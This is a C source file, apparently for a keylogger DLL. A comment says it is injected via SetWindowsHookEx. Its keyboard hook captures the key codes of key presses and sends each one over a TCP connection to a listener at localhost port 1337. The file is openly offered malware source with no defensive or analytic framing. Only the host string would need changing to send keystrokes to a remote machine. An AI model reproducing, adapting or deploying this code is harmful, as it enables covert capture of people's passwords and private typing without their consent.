//Inject_Payload_HookKeyTTY is injected via SetWindowsHookEx
#define WIN32_LEAN_AND_MEAN 
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <stdlib.h>   
#include "inject_payload_hookkeyboard.h"

#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")
SOCKET sock = INVALID_SOCKET;

SOCKET CreateClientSocket(const char* serverAddr, const char* port)
{
	//setting up a client socket for WINSOCK, mostly copied from the msdn example code
	WSADATA wsaData;
	int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);

	SOCKET ConnectSocket = INVALID_SOCKET;

	if (iResult != 0)
	{
		printf("WSAStartup failed: %d\n", iResult);
		return ConnectSocket;
	}

	struct addrinfo* result = NULL;
	struct addrinfo* ptr = NULL;
	struct addrinfo hints;

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET; //use ipv4
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	// Resolve the server address and port
	iResult = getaddrinfo(serverAddr, port, &hints, &result);
	if (iResult != 0)
	{
		printf("getaddrinfo failed: %d\n", iResult);
		WSACleanup();
		return ConnectSocket;
	}

	// Attempt to connect to the first address returned by
	// the call to getaddrinfo
	ptr = result;

	// Create a SOCKET for connecting to server
	ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);

	if (ConnectSocket == INVALID_SOCKET)
	{
		printf("Error at socket(): %ld\n", WSAGetLastError());
		freeaddrinfo(result);
		WSACleanup();
		return ConnectSocket;
	}

	iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);

	if (iResult == SOCKET_ERROR)
	{
		closesocket(ConnectSocket);
		ConnectSocket = INVALID_SOCKET;
	}

	freeaddrinfo(result);

	if (ConnectSocket == INVALID_SOCKET)
	{
		printf("Unable to connect to server!\n");
		WSACleanup();
	}

	return ConnectSocket;
}

LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam)
{
	const int BUFLEN = 512;
	char sendBuf[BUFLEN];
	memset(sendBuf, '\0', BUFLEN);

	if (sock == INVALID_SOCKET)
	{
		sock = CreateClientSocket("localhost", "1337");
	}

	int isKeyDown = (int)lParam >> 30;
	if (isKeyDown)
	{
		_itoa_s<512>((int)wParam, sendBuf, 10);
		send(sock, sendBuf, (int)strlen(sendBuf), 0);
	}
	return 1;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD ul_reason_for_call, LPVOID lpvReserved)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		break;
	}
	return true;
}